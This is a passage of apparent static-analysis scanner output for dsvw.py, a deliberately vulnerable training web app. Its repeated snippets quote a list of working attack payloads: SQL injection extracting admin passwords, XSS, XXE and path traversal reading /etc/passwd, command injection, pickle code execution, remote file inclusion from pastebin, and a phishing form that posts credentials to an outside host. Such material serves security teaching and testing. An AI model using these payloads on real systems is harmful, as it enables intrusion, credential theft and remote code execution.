\"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting\"), (\"Cross Site Scripting (<i>stored</i>)\", \"/?comment=\\\" onclick=\\\"document.location='/?comment='+prompt('please leave a comment'); return false\", \"/?comment=%3Cscript%3Ealert(%22arbitrary%20javascript%22)%3C%2Fscript%3E\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting\"), (\"Cross Site Scripting (<i>DOM</i>)\", \"/?#lang=en\", \"/?foobar#lang=en%3Cscript%3Ealert(%22arbitrary%20javascript%22)%3C%2Fscript%3E\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/01-Testing_for_DOM-based_Cross_Site_Scripting\"), (\"Cross Site Scripting (<i>JSONP</i>)\", \"/users.json?callback=process\\\" onclick=\\\"var script=document.createElement('script');script.src='/users.json?callback=process';document.getElementsByTagName('head')[0].appendChild(script);return false\", \"/users.json?callback=alert(%22arbitrary%20javascript%22)%3Bprocess\\\" onclick=\\\"var script=document.createElement('script');script.src='/users.json?callback=alert(%22arbitrary%20javascript%22)%3Bprocess';document.getElementsByTagName('head')[0].appendChild(script);return false\", \"http://www.metaltoad.com/blog/using-jsonp-safely\"), (\"XML External Entity (<i>local</i>)\", \"/?xml=%3Croot%3E%3C%2Froot%3E\", \"/?xml=%3C!DOCTYPE%20example%20%5B%3C!ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E%3Croot%3E%26xxe%3B%3C%2Froot%3E\" if os.name != \"nt\" else \"/?xml=%3C!DOCTYPE%20example%20%5B%3C!ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2FC%3A%2FWindows%2Fwin.ini%22%3E%5D%3E%3Croot%3E%26xxe%3B%3C%2Froot%3E\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection\"), (\"XML External Entity (<i>remote</i>)\", \"/?xml=%3Croot%3E%3C%2Froot%3E\", \"/?xml=%3C!DOCTYPE%20example%20%5B%3C!ENTITY%20xxe%20SYSTEM%20%22http%3A%2F%2Fhttpbin.org%2Fbase64%2FSGVsbG8sIFdvcmxkIQ%3D%3D%22%3E%5D%3E%3Croot%3E%26xxe%3B%3C%2Froot%3E\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection\"), (\"Server Side Request Forgery\", \"/?path=\", \"/?path=http%3A%2F%2F127.0.0.1%3A631\" if os.name != \"nt\" else \"/?path=%5C%5C127.0.0.1%5CC%24%5CWindows%5Cwin.ini\", \"http://www.bishopfox.com/blog/2015/04/vulnerable-by-design-understanding-server-side-request-forgery/\"), (\"Blind XPath Injection (<i>boolean</i>)\", \"/?name=dian\", \"/?name=admin%27%20and%20substring(password%2Ftext()%2C3%2C1)%3D%27n\\\" onclick=\\\"alert('checking if the third character for admin\\\\'s password is letter \\\\'n\\\\' (true in case of found item)')\", \"https://owasp.org/www-community/attacks/XPATH_Injection\"), (\"Cross Site Request Forgery\", \"/?comment=\", \"/?v=%3Cimg%20src%3D%22%2F%3Fcomment%3D%253Cdiv%2520style%253D%2522color%253Ared%253B%2520font-weight%253A%2520bold%2522%253EI%2520quit%2520the%2520job%253C%252Fdiv%253E%22%3E\\\" onclick=\\\"alert('please visit \\\\'vulnerable\\\\' page to see what this click has caused')\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery\"), (\"Frame Injection (<i>phishing</i>)\", \"/?v=0.4\", \"/?v=0.4%3Ciframe%20src%3D%22https%3A%2F%2Fdemo.sekuripy.hr%2Fdsvw%2Flogin.html%22%20style%3D%22background-color%3Awhite%3Bz-index%3A10%3Btop%3A10%25%3Bleft%3A10%25%3Bposition%3Afixed%3Bborder-collapse%3Acollapse%3Bborder%3A1px%20solid%20%23a8a8a8%22%3E%3C%2Fiframe%3E\", \"http://www.gnucitizen.org/blog/frame-injection-fun/\"), (\"Frame Injection (<i>content spoofing</i>)\", \"/?v=0.4\", \"/?v=0.4%3Ciframe%20src%3D%22https%3A%2F%2Fdemo.sekuripy.hr%2Fdsvw%2Fframe.html%22%20style%3D%22background-color%3Awhite%3Bwidth%3A100%25%3Bheight%3A100%25%3Bz-index%3A10%3Btop%3A0%3Bleft%3A0%3Bposition%3Afixed%3B%22%20frameborder%3D%220%22%3E%3C%2Fiframe%3E\", \"http://www.gnucitizen.org/blog/frame-injection-fun/\"), (\"Clickjacking\", None, \"/?v=0.4%3Cdiv%20style%3D%22opacity%3A0%3Bfilter%3Aalpha(opacity%3D20)%3Bbackground-color%3A%23000%3Bwidth%3A100%25%3Bheight%3A100%25%3Bz-index%3A10%3Btop%3A0%3Bleft%3A0%3Bposition%3Afixed%3B%22%20onclick%3D%22document.location%3D%27https%3A%2F%2Fdemo.sekuripy.hr%2Fdsvw%2Fclickjacking.html%27%22%3E%3C%2Fdiv%3E%3Cscript%3Ealert(%22click%20anywhere%20on%20page%22)%3B%3C%2Fscript%3E\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/09-Testing_for_Clickjacking\"), (\"Unvalidated Redirect\", \"/?redir=\", \"/?redir=https%3A%2F%2Fgeekprank.com%2F\", \"https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html\"), (\"Arbitrary Code Execution\", \"/?domain=www.google.com\", \"/?domain=www.google.com%3B%20ifconfig\" if os.name != \"nt\" else \"/?domain=www.google.com%26%20ipconfig\", \"https://en.wikipedia.org/wiki/Arbitrary_code_execution\"), (\"Full Path Disclosure\", \"/?path=\", \"/?path=foobar\", \"https://owasp.org/www-community/attacks/Full_Path_Disclosure\"), (\"Source Code Disclosure\", \"/?path=\", \"/?path=dsvw.py\", \"https://www.imperva.com/resources/glossary?term=source_code_disclosure\"), (\"Path Traversal\", \"/?path=\", \"/?path=..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd\" if os.name != \"nt\" else \"/?path=..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini\", \"https://www.owasp.org/index.php/Path_Traversal\"), (\"File Inclusion (<i>remote</i>)\", \"/?include=\", \"/?include=https%%3A%%2F%%2Fpastebin.com%%2Fraw%%2F6VyyNNhc&amp;cmd=%s\" % (\"ifconfig\" if os.name != \"nt\" else \"ipconfig\"), \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion\"), (\"HTTP Header Injection (<i>phishing</i>)\", \"/?charset=utf8\", \"/?charset=utf8%0D%0AX-XSS-Protection:0%0D%0AContent-Length:388%0D%0A%0D%0A%3C!DOCTYPE%20html%3E%3Chtml%3E%3Chead%3E%3Ctitle%3ELogin%3C%2Ftitle%3E%3C%2Fhead%3E%3Cbody%20style%3D%27font%3A%2012px%20monospace%27%3E%3Cform%20action%3D%22http%3A%2F%2Fdsvw.c1.biz%2Fi%2Flog.php%22%20onSubmit%3D%22alert(%27visit%20%5C%27http%3A%2F%2Fdsvw.c1.biz%2Fi%2Flog.txt%5C%27%20to%20see%20your%20phished%20credentials%27)%22%3EUsername%3A%3Cbr%3E%3Cinput%20type%3D%22text%22%20name%3D%22username%22%3E%3Cbr%3EPassword%3A%3Cbr%3E%3Cinput%20type%3D%22password%22%20name%3D%22password%22%3E%3Cinput%20type%3D%22submit%22%20value%3D%22Login%22%3E%3C%2Fform%3E%3C%2Fbody%3E%3C%2Fhtml%3E\", \"https://www.rapid7.com/db/vulnerabilities/http-generic-script-header-injection\"), (\"Component with Known Vulnerability (<i>pickle</i>)\", \"/?object=%s\" % urllib.parse.quote(pickle.dumps(dict((_.findtext(\"username\"), (_.findtext(\"name\"), _.findtext(\"surname\"))) for _ in xml.etree.ElementTree.fromstring(USERS_XML).findall(\"user\")))), \"/?object=cos%%0Asystem%%0A(S%%27%s%%27%%0AtR.%%0A\\\" onclick=\\\"alert('checking if arbitrary code can be executed remotely (true in case of delayed response)')\" % urllib.parse.quote(\"ping -c 5 127.0.0.1\" if os.name != \"nt\" else \"ping -n 5 127.0.0.1\"), \"https://www.cs.uic.edu/~s/musings/pickle.html\"), (\"Denial of Service (<i>memory</i>)\", \"/?size=32\", \"/?size=9999999\", \"https://owasp.org/www-community/attacks/Denial_of_Service\"))", "highlightLines": [12]}, "category": "code", "location": {"file": "dsvw.py", "line": 12, "column": 6546}, "severity": "medium", "references": [], "description": ""}, {"id": "19b5be58f6ca", "fix": {"template": null, "available": false}, "title": "Compiled regex findall - ensure pattern is not vulnerable to ReDoS", "ruleId": "rules.py-redos-compiled-findall", "snippet": {"code": "CASES = ((\"Blind SQL Injection (<i>boolean</i>)\", \"?id=2\", \"/?id=2%20AND%20SUBSTR((SELECT%20password%20FROM%20users%20WHERE%20name%3D%27admin%27)%2C1%2C1)%3D%277%27\\\" onclick=\\\"alert('checking if the first character for admin\\\\'s password is digit \\\\'7\\\\' (true in case of same result(s) as for \\\\'vulnerable\\\\')')\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection#boolean-exploitation-technique\"), (\"Blind SQL Injection (<i>time</i>)\", \"?id=2\", \"/?id=(SELECT%20(CASE%20WHEN%20(SUBSTR((SELECT%20password%20FROM%20users%20WHERE%20name%3D%27admin%27)%2C2%2C1)%3D%27e%27)%20THEN%20(LIKE(%27ABCDEFG%27%2CUPPER(HEX(RANDOMBLOB(300000000)))))%20ELSE%200%20END))\\\" onclick=\\\"alert('checking if the second character for admin\\\\'s password is letter \\\\'e\\\\' (true in case of delayed response)')\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection#time-delay-exploitation-technique\"), (\"UNION SQL Injection\", \"?id=2\", \"/?id=2%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20(SELECT%20id%7C%7C%27%2C%27%7C%7Cusername%7C%7C%27%2C%27%7C%7Cpassword%20FROM%20users%20WHERE%20username%3D%27admin%27)\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection#union-exploitation-technique\"), (\"Login Bypass\", \"/login?username=&amp;password=\", \"/login?username=admin&amp;password=%27%20OR%20%271%27%20LIKE%20%271\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection#classic-sql-injection\"), (\"HTTP Parameter Pollution\", \"/login?username=&amp;password=\", \"/login?username=admin&amp;password=%27%2F*&amp;password=*%2FOR%2F*&amp;password=*%2F%271%27%2F*&amp;password=*%2FLIKE%2F*&amp;password=*%2F%271\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution\"), (\"Cross Site Scripting (<i>reflected</i>)\", \"/?v=0.4\", \"/?v=0.4%3Cscript%3Ealert(%22arbitrary%20javascript%22)%3C%2Fscript%3E\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting\"), (\"Cross Site Scripting (<i>stored</i>)\", \"/?comment=\\\" onclick=\\\"document.location='/?comment='+prompt('please leave a comment'); return false\", \"/?comment=%3Cscript%3Ealert(%22arbitrary%20javascript%22)%3C%2Fscript%3E\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting\"), (\"Cross Site Scripting (<i>DOM</i>)\", \"/?#lang=en\", \"/?foobar#lang=en%3Cscript%3Ealert(%22arbitrary%20javascript%22)%3C%2Fscript%3E\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/01-Testing_for_DOM-based_Cross_Site_Scripting\"), (\"Cross Site Scripting (<i>JSONP</i>)\", \"/users.json?callback=process\\\" onclick=\\\"var script=document.createElement('script');script.src='/users.json?callback=process';document.getElementsByTagName('head')[0].appendChild(script);return false\", \"/users.json?callback=alert(%22arbitrary%20javascript%22)%3Bprocess\\\" onclick=\\\"var script=document.createElement('script');script.src='/users.json?callback=alert(%22arbitrary%20javascript%22)%3Bprocess';document.getElementsByTagName('head')[0].appendChild(script);return false\", \"http://www.metaltoad.com/blog/using-jsonp-safely\"), (\"XML External Entity (<i>local</i>)\", \"/?xml=%3Croot%3E%3C%2Froot%3E\", \"/?xml=%3C!DOCTYPE%20example%20%5B%3C!ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E%3Croot%3E%26xxe%3B%3C%2Froot%3E\" if os.name != \"nt\" else \"/?xml=%3C!DOCTYPE%20example%20%5B%3C!ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2FC%3A%2FWindows%2Fwin.ini%22%3E%5D%3E%3Croot%3E%26xxe%3B%3C%2Froot%3E\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection\"), (\"XML External Entity (<i>remote</i>)\", \"/?xml=%3Croot%3E%3C%2Froot%3E\", \"/?xml=%3C!DOCTYPE%20example%20%5B%3C!ENTITY%20xxe%20SYSTEM%20%22http%3A%2F%2Fhttpbin.org%2Fbase64%2FSGVsbG8sIFdvcmxkIQ%3D%3D%22%3E%5D%3E%3Croot%3E%26xxe%3B%3C%2Froot%3E\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection\"), (\"Server Side Request Forgery\", \"/?path=\", \"/?path=http%3A%2F%2F127.0.0.1%3A631\" if os.name != \"nt\" else \"/?path=%5C%5C127.0.0.1%5CC%24%5CWindows%5Cwin.ini\", \"http://www.bishopfox.com/blog/2015/04/vulnerable-by-design-understanding-server-side-request-forgery/\"), (\"Blind XPath Injection (<i>boolean</i>)\", \"/?name=dian\", \"/?name=admin%27%20and%20substring(password%2Ftext()%2C3%2C1)%3D%27n\\\" onclick=\\\"alert('checking if the third character for admin\\\\'s password is letter \\\\'n\\\\' (true in case of found item)')\", \"https://owasp.org/www-community/attacks/XPATH_Injection\"), (\"Cross Site Request Forgery\", \"/?comment=\", \"/?v=%3Cimg%20src%3D%22%2F%3Fcomment%3D%253Cdiv%2520style%253D%2522color%253Ared%253B%2520font-weight%253A%2520bold%2522%253EI%2520quit%2520the%2520job%253C%252Fdiv%253E%22%3E\\\" onclick=\\\"alert('please visit \\\\'vulnerable\\\\' page to see what this click has caused')\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery\"), (\"Frame Injection (<i>phishing</i>)\", \"/?v=0.4\", \"/?v=0.4%3Ciframe%20src%3D%22https%3A%2F%2Fdemo.sekuripy.hr%2Fdsvw%2Flogin.html%22%20style%3D%22background-color%3Awhite%3Bz-index%3A10%3Btop%3A10%25%3Bleft%3A10%25%3Bposition%3Afixed%3Bborder-collapse%3Acollapse%3Bborder%3A1px%20solid%20%23a8a8a8%22%3E%3C%2Fiframe%3E\", \"http://www.gnucitizen.org/blog/frame-injection-fun/\"), (\"Frame Injection (<i>content spoofing</i>)\", \"/?v=0.4\", \"/?v=0.4%3Ciframe%20src%3D%22https%3A%2F%2Fdemo.sekuripy.hr%2Fdsvw%2Fframe.html%22%20style%3D%22background-color%3Awhite%3Bwidth%3A100%25%3Bheight%3A100%25%3Bz-index%3A10%3Btop%3A0%3Bleft%3A0%3Bposition%3Afixed%3B%22%20frameborder%3D%220%22%3E%3C%2Fiframe%3E\", \"http://www.gnucitizen.org/blog/frame-injection-fun/\"), (\"Clickjacking\", None, \"/?v=0.4%3Cdiv%20style%3D%22opacity%3A0%3Bfilter%3Aalpha(opacity%3D20)%3Bbackground-color%3A%23000%3Bwidth%3A100%25%3Bheight%3A100%25%3Bz-index%3A10%3Btop%3A0%3Bleft%3A0%3Bposition%3Afixed%3B%22%20onclick%3D%22document.location%3D%27https%3A%2F%2Fdemo.sekuripy.hr%2Fdsvw%2Fclickjacking.html%27%22%3E%3C%2Fdiv%3E%3Cscript%3Ealert(%22click%20anywhere%20on%20page%22)%3B%3C%2Fscript%3E\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/09-Testing_for_Clickjacking\"), (\"Unvalidated Redirect\", \"/?redir=\", \"/?redir=https%3A%2F%2Fgeekprank.com%2F\", \"https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html\"), (\"Arbitrary Code Execution\", \"/?domain=www.google.com\", \"/?domain=www.google.com%3B%20ifconfig\" if os.name != \"nt\" else \"/?domain=www.google.com%26%20ipconfig\", \"https://en.wikipedia.org/wiki/Arbitrary_code_execution\"), (\"Full Path Disclosure\", \"/?path=\", \"/?path=foobar\", \"https://owasp.org/www-community/attacks/Full_Path_Disclosure\"), (\"Source Code Disclosure\", \"/?path=\", \"/?path=dsvw.py\", \"https://www.imperva.com/resources/glossary?term=source_code_disclosure\"), (\"Path Traversal\", \"/?path=\", \"/?path=..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd\" if os.name != \"nt\" else \"/?path=..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini\", \"https://www.owasp.org/index.php/Path_Traversal\"), (\"File Inclusion (<i>remote</i>)\", \"/?include=\", \"/?include=https%%3A%%2F%%2Fpastebin.com%%2Fraw%%2F6VyyNNhc&amp;cmd=%s\" % (\"ifconfig\" if os.name != \"nt\" else \"ipconfig\"), \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion\"), (\"HTTP Header Injection (<i>phishing</i>)\", \"/?charset=utf8\", \"/?charset=utf8%0D%0AX-XSS-Protection:0%0D%0AContent-Length:388%0D%0A%0D%0A%3C!DOCTYPE%20html%3E%3Chtml%3E%3Chead%3E%3Ctitle%3ELogin%3C%2Ftitle%3E%3C%2Fhead%3E%3Cbody%20style%3D%27font%3A%2012px%20monospace%27%3E%3Cform%20action%3D%22http%3A%2F%2Fdsvw.c1.biz%2Fi%2Flog.php%22%20onSubmit%3D%22alert(%27visit%20%5C%27http%3A%2F%2Fdsvw.c1.biz%2Fi%2Flog.txt%5C%27%20to%20see%20your%20phished%20credentials%27)%22%3EUsername%3A%3Cbr%3E%3Cinput%20type%3D%22text%22%20name%3D%22username%22%3E%3Cbr%3EPassword%3A%3Cbr%3E%3Cinput%20type%3D%22password%22%20name%3D%22password%22%3E%3Cinput%20type%3D%22submit%22%20value%3D%22Login%22%3E%3C%2Fform%3E%3C%2Fbody%3E%3C%2Fhtml%3E\", \"https://www.rapid7.com/db/vulnerabilities/http-generic-script-header-injection\"), (\"Component with Known Vulnerability (<i>pickle</i>)\", \"/?object=%s\" % urllib.parse.quote(pickle.dumps(dict((_.findtext(\"username\"), (_.findtext(\"name\"), _.findtext(\"surname\"))) for _ in xml.etree.ElementTree.fromstring(USERS_XML).findall(\"user\")))), \"/?object=cos%%0Asystem%%0A(S%%27%s%%27%%0AtR.%%0A\\\" onclick=\\\"alert('checking if arbitrary code can be executed remotely (true in case of delayed response)')\" % urllib.parse.quote(\"ping -c 5 127.0.0.1\" if os.name != \"nt\" else \"ping -n 5 127.0.0.1\"), \"https://www.cs.uic.edu/~s/musings/pickle.html\"), (\"Denial of Service (<i>memory</i>)\", \"/?size=32\", \"/?size=9999999\", \"https://owasp.org/www-community/attacks/Denial_of_Service\"))", "highlightLines": [12]}, "category": "code", "location": {"file": "dsvw.py", "line": 12, "column": 9299}, "severity": "info", "references": [], "description": ""}, {"id": "1a9f0a7c68a6", "fix": {"template": null, "available": false}, "title": "XML Element findall with XPath - potential XPath injection (CWE-643)", "ruleId": "rules.py-xpath-etree-findall", "snippet": {"code": "CASES = ((\"Blind SQL Injection (<i>boolean</i>)\", \"?id=2\", \"/?id=2%20AND%20SUBSTR((SELECT%20password%20FROM%20users%20WHERE%20name%3D%27admin%27)%2C1%2C1)%3D%277%27\\\" onclick=\\\"alert('checking if the first character for admin\\\\'s password is digit \\\\'7\\\\' (true in case of same result(s) as for \\\\'vulnerable\\\\')')\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection#boolean-exploitation-technique\"), (\"Blind SQL Injection (<i>time</i>)\", \"?id=2\", \"/?id=(SELECT%20(CASE%20WHEN%20(SUBSTR((SELECT%20password%20FROM%20users%20WHERE%20name%3D%27admin%27)%2C2%2C1)%3D%27e%27)%20THEN%20(LIKE(%27ABCDEFG%27%2CUPPER(HEX(RANDOMBLOB(300000000)))))%20ELSE%200%20END))\\\" onclick=\\\"alert('checking if the second character for admin\\\\'s password is letter \\\\'e\\\\' (true in case of delayed response)')\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection#time-delay-exploitation-technique\"), (\"UNION SQL Injection\", \"?id=2\", \"/?id=2%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20(SELECT%20id%7C%7C%27%2C%27%7C%7Cusername%7C%7C%27%2C%27%7C%7Cpassword%20FROM%20users%20WHERE%20username%3D%27admin%27)\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection#union-exploitation-technique\"), (\"Login Bypass\", \"/login?username=&amp;password=\", \"/login?username=admin&amp;password=%27%20OR%20%271%27%20LIKE%20%271\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection#classic-sql-injection\"), (\"HTTP Parameter Pollution\", \"/login?username=&amp;password=\", \"/login?username=admin&amp;password=%27%2F*&amp;password=*%2FOR%2F*&amp;password=*%2F%271%27%2F*&amp;password=*%2FLIKE%2F*&amp;password=*%2F%271\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution\"), (\"Cross Site Scripting (<i>reflected</i>)\", \"/?v=0.4\", \"/?v=0.4%3Cscript%3Ealert(%22arbitrary%20javascript%22)%3C%2Fscript%3E\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting\"), (\"Cross Site Scripting (<i>stored</i>)\", \"/?comment=\\\" onclick=\\\"document.location='/?comment='+prompt('please leave a comment'); return false\", \"/?comment=%3Cscript%3Ealert(%22arbitrary%20javascript%22)%3C%2Fscript%3E\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting\"), (\"Cross Site Scripting (<i>DOM</i>)\", \"/?#lang=en\", \"/?foobar#lang=en%3Cscript%3Ealert(%22arbitrary%20javascript%22)%3C%2Fscript%3E\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/01-Testing_for_DOM-based_Cross_Site_Scripting\"), (\"Cross Site Scripting (<i>JSONP</i>)\", \"/users.json?callback=process\\\" onclick=\\\"var script=document.createElement('script');script.src='/users.json?callback=process';document.getElementsByTagName('head')[0].appendChild(script);return false\", \"/users.json?callback=alert(%22arbitrary%20javascript%22)%3Bprocess\\\" onclick=\\\"var script=document.createElement('script');script.src='/users.json?callback=alert(%22arbitrary%20javascript%22)%3Bprocess';document.getElementsByTagName('head')[0].appendChild(script);return false\", \"http://www.metaltoad.com/blog/using-jsonp-safely\"), (\"XML External Entity (<i>local</i>)\", \"/?xml=%3Croot%3E%3C%2Froot%3E\", \"/?xml=%3C!DOCTYPE%20example%20%5B%3C!ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E%3Croot%3E%26xxe%3B%3C%2Froot%3E\" if os.name != \"nt\" else \"/?xml=%3C!DOCTYPE%20example%20%5B%3C!ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2FC%3A%2FWindows%2Fwin.ini%22%3E%5D%3E%3Croot%3E%26xxe%3B%3C%2Froot%3E\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection\"), (\"XML External Entity (<i>remote</i>)\", \"/?xml=%3Croot%3E%3C%2Froot%3E\", \"/?xml=%3C!DOCTYPE%20example%20%5B%3C!ENTITY%20xxe%20SYSTEM%20%22http%3A%2F%2Fhttpbin.org%2Fbase64%2FSGVsbG8sIFdvcmxkIQ%3D%3D%22%3E%5D%3E%3Croot%3E%26xxe%3B%3C%2Froot%3E\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection\"), (\"Server Side Request Forgery\", \"/?path=\", \"/?path=http%3A%2F%2F127.0.0.1%3A631\" if os.name != \"nt\" else \"/?path=%5C%5C127.0.0.1%5CC%24%5CWindows%5Cwin.ini\", \"http://www.bishopfox.com/blog/2015/04/vulnerable-by-design-understanding-server-side-request-forgery/\"), (\"Blind XPath Injection (<i>boolean</i>)\", \"/?name=dian\", \"/?name=admin%27%20and%20substring(password%2Ftext()%2C3%2C1)%3D%27n\\\" onclick=\\\"alert('checking if the third character for admin\\\\'s password is letter \\\\'n\\\\' (true in case of found item)')\", \"https://owasp.org/www-community/attacks/XPATH_Injection\"), (\"Cross Site Request Forgery\", \"/?comment=\", \"/?v=%3Cimg%20src%3D%22%2F%3Fcomment%3D%253Cdiv%2520style%253D%2522color%253Ared%253B%2520font-weight%253A%2520bold%2522%253EI%2520quit%2520the%2520job%253C%252Fdiv%253E%22%3E\\\" onclick=\\\"alert('please visit \\\\'vulnerable\\\\' page to see what this click has caused')\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery\"), (\"Frame Injection (<i>phishing</i>)\", \"/?v=0.4\", \"/?v=0.4%3Ciframe%20src%3D%22https%3A%2F%2Fdemo.sekuripy.hr%2Fdsvw%2Flogin.html%22%20style%3D%22background-color%3Awhite%3Bz-index%3A10%3Btop%3A10%25%3Bleft%3A10%25%3Bposition%3Afixed%3Bborder-collapse%3Acollapse%3Bborder%3A1px%20solid%20%23a8a8a8%22%3E%3C%2Fiframe%3E\", \"http://www.gnucitizen.org/blog/frame-injection-fun/\"), (\"Frame Injection (<i>content spoofing</i>)\", \"/?v=0.4\", \"/?v=0.4%3Ciframe%20src%3D%22https%3A%2F%2Fdemo.sekuripy.hr%2Fdsvw%2Fframe.html%22%20style%3D%22background-color%3Awhite%3Bwidth%3A100%25%3Bheight%3A100%25%3Bz-index%3A10%3Btop%3A0%3Bleft%3A0%3Bposition%3Afixed%3B%22%20frameborder%3D%220%22%3E%3C%2Fiframe%3E\", \"http://www.gnucitizen.org/blog/frame-injection-fun/\"), (\"Clickjacking\", None, \"/?v=0.4%3Cdiv%20style%3D%22opacity%3A0%3Bfilter%3Aalpha(opacity%3D20)%3Bbackground-color%3A%23000%3Bwidth%3A100%25%3Bheight%3A100%25%3Bz-index%3A10%3Btop%3A0%3Bleft%3A0%3Bposition%3Afixed%3B%22%20onclick%3D%22document.location%3D%27https%3A%2F%2Fdemo.sekuripy.hr%2Fdsvw%2Fclickjacking.html%27%22%3E%3C%2Fdiv%3E%3Cscript%3Ealert(%22click%20anywhere%20on%20page%22)%3B%3C%2Fscript%3E\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/09-Testing_for_Clickjacking\"), (\"Unvalidated Redirect\", \"/?redir=\", \"/?redir=https%3A%2F%2Fgeekprank.com%2F\", \"https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html\"), (\"Arbitrary Code Execution\", \"/?domain=www.google.com\", \"/?domain=www.google.com%3B%20ifconfig\" if os.name != \"nt\" else \"/?domain=www.google.com%26%20ipconfig\", \"https://en.wikipedia.org/wiki/Arbitrary_code_execution\"), (\"Full Path Disclosure\", \"/?path=\", \"/?path=foobar\", \"https://owasp.org/www-community/attacks/Full_Path_Disclosure\"), (\"Source Code Disclosure\", \"/?path=\", \"/?path=dsvw.py\", \"https://www.imperva.com/resources/glossary?term=source_code_disclosure\"), (\"Path Traversal\", \"/?path=\", \"/?path=..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd\" if os.name != \"nt\" else \"/?path=..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini\", \"https://www.owasp.org/index.php/Path_Traversal\"), (\"File Inclusion (<i>remote</i>)\", \"/?include=\", 